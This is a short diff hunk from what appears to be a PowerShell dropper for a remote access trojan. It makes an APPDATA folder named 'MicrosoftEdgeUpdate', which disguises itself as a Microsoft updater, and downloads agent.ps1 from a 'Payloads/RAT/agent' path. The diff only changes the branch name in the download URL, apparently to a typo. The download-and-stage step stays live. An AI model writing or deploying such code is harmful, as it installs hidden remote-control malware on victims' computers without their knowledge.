@@ -4,7 +4,7 @@ $installDir = Join-Path $env:APPDATA "MicrosoftEdgeUpdate"
 $vbsDir = Join-Path $env:APPDATA "Microsoft"
 New-Item -ItemType Directory -Force -Path $installDir
 
-$baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/agent/"
+$baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/maj/RAT/agent/"
 Invoke-WebRequest -Uri ($baseUrl + "agent.ps1") -OutFile (Join-Path $installDir "agent.ps1")
 
 $agentPath = Join-Path $installDir "agent.ps1"
